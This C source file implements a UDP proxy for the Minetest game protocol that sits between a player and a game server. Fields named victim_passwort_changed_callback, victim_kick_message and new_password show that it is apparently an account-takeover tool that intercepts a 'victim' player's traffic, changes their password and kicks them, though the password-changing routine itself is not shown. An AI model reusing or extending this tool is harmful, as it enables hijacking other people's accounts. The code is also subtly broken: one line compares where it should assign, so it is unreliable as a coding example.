// Implementation von
#include "proxy.h"
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>

#include "genericpacket.h"
#include "mtserver.h"
#include "mtclient.h"
#include "util.h"

Proxy* init_proxy(ProxyArgs* args) {
    Proxy* proxy = malloc(sizeof(Proxy));
    if (proxy == NULL) {
        fatal_error("Out of memory!");
    }

    proxy->client.username_len = 0;
    proxy->client.username == NULL;
    proxy->running = false;
    proxy->status = PROXY_NOT_RUNNING;
    proxy->victim_passwort_changed_callback = args->victim_passwort_changed_callback;
    proxy->victim_kick_message = args->victim_kick_message;
    proxy->new_password = args->new_password;

    return proxy;
}

void start_proxy(Proxy* proxy, ProxyArgs* args) {
    proxy->listen_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (proxy->listen_fd < 0) {
        fatal_error("An error occoured while creating a socket.");
    }

    struct sockaddr_in server_addr;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(args->port);
    server_addr.sin_family = AF_INET;

    if (bind(proxy->listen_fd, (struct sockaddr*) &server_addr, sizeof(server_addr)) < 0) {
        fatal_error("Bind-Port failed-");
    }

    // Clientvorbereitung
    proxy->client.remote_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (proxy->client.remote_fd < 0) {
        fatal_error("An error occoured while creating a socket.");
    }

    struct hostent* host = gethostbyname(args->remote_hostname);
    if (host == NULL) {
        fatal_error("Unable to gather the IP-Address of the given host");
    }
    
    struct sockaddr_in remote_addr;
    remote_addr.sin_addr.s_addr = *((in_addr_t*) host->h_addr_list[0]);
    remote_addr.sin_port = htons(args->remote_port);
    remote_addr.sin_family = AF_INET;

    if (connect(proxy->client.remote_fd, &remote_addr, sizeof(remote_addr)) < 0) {
        fatal_error("Unable to prepare the connection to the remote server!");
    }
    
    proxy->running = true;
    proxy->status = PROXY_WAIT;
    proxy->client.seqnum = SEQNUM_INITAL;
}

void tick_proxy(Proxy* proxy, uint8_t* netbuff, size_t buffsize) {
    client_ack_incomming(&(proxy->client));

    static int len = sizeof(proxy->victim_addr);
    ssize_t read = recvfrom(proxy->listen_fd, netbuff, buffsize, MSG_DONTWAIT, (struct sockaddr*) &proxy->victim_addr, &len);
    if (read <= 0)  {
        return;
    }
    if (read == buffsize) {
        puts("Ignored clientpacket due to being too big! WTF? Out buffer is already overkill!");
        return;
    }
    
    generic_header* header = (generic_header*) netbuff;
    if (header->protocol_id != PROTOCOL_ID) {
        puts("Received non-minetest packet!");
        return;
    }
    handle_clientpacket(netbuff, read, proxy);
}

void halt_proxy(Proxy* proxy) {
    if (!proxy->running) {
        return;
    }

    close(proxy->listen_fd);
    close(proxy->client.remote_fd);

    proxy->running = false;
    proxy->status = PROXY_NOT_RUNNING;
}

void free_proxy(Proxy** proxy) {
    if ((*proxy)->running) {
        halt_proxy(*proxy);
    }

    if ((*proxy)->client.username != NULL) {
        free((*proxy)->client.username);
    }

    free(*proxy);
    *proxy = NULL;
}
// EOF